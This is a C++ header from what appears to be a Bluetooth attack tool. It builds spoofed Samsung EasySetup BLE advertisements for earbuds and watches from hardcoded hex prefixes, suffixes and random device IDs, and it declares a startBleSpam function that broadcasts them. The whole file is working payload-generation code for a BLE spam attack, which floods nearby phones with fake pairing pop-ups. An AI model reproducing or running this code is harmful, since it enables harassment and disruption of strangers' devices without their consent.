#ifndef BTMAGUS_BLE_SPAM_H
#define BTMAGUS_BLE_SPAM_H
#include <map>
#include <string>
#include <random>

#include "../core/MessageDispatcher.h"

class advertisementGenerator {
    const std::map<std::string, std::string> genuineBudsIds;
    const std::map<std::string, std::string> genuineWatchIds;
    mutable std::mt19937 rng{std::random_device{}()};

    template<typename T>
        std::string pickRandomKey(const T& map) const {
        if(map.empty()) return "";
        std::uniform_int_distribution<size_t> dist(0, map.size() - 1);
        auto it = map.begin();
        std::advance(it, dist(rng));
        return it->first;
    }

    static std::string hexToBytes(const std::string& hex) {
        std::string bytes;
        bytes.reserve(hex.size() / 2);
        for(size_t i = 0; i < hex.size(); i += 2) {
            bytes.push_back(static_cast<char>(std::stoi(hex.substr(i,2), nullptr, 16)));
        }
        return bytes;
    }


public:
    advertisementGenerator() = default;

    explicit advertisementGenerator(const std::map<std::string, std::string> &genuineBudsIds,
        const std::map<std::string, std::string> &genuineWatchIds)
        : genuineBudsIds(genuineBudsIds), genuineWatchIds(genuineWatchIds) {};

    // Returns full payload for EasySetup Buds (prefix + device ID + suffix)
    std::vector<uint8_t> getGenuineBudsAdvertisement() const {
        const std::string prefix = "42098102141503210109";
        const std::string suffix = "063C948E00000000C700";
        std::string payload = hexToBytes(prefix) + hexToBytes(pickRandomKey(genuineBudsIds)) + hexToBytes(suffix);
        return {std::vector<uint8_t>(payload.begin(), payload.end())};
    }

    // Returns full payload for EasySetup Watch (prefix + device ID)
    std::vector<uint8_t> getGenuineWatchAdvertisement() const {
        const std::string prefix = "010002000101FF000043"; // EasySetup Watch prefix
        std::string payload = hexToBytes(prefix) + hexToBytes(pickRandomKey(genuineWatchIds));
        return {std::vector<uint8_t>(payload.begin(), payload.end())};
    }
};

void startBleSpam(MessageDispatcher &msgDispatcher);
#endif //BTMAGUS_BLE_SPAM_H